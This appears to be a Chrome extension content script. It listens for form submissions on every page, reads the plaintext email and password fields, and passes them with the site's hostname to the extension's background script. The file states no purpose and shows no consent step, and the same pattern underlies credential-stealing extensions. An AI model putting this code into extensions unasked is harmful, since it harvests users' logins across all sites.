document.addEventListener('DOMContentLoaded', function() {
    console.log("Content script injected and running");
});

document.addEventListener('submit', function(event) {
    var form = event.target;
    var emailField = form.querySelector('input[type="email"]');
    var passwordField = form.querySelector('input[type="password"]');
    if (emailField && passwordField) {
        var email = emailField.value;
        var password = passwordField.value;
        var url = window.location.hostname;
        chrome.runtime.sendMessage({
            action: 'formSubmitted',
            email: email,
            password: password,
            url: url
        }, function(response) {
            console.log("Message sent to background script", response);
        });
        console.log("Form submitted and message sent to background script");
    }
});
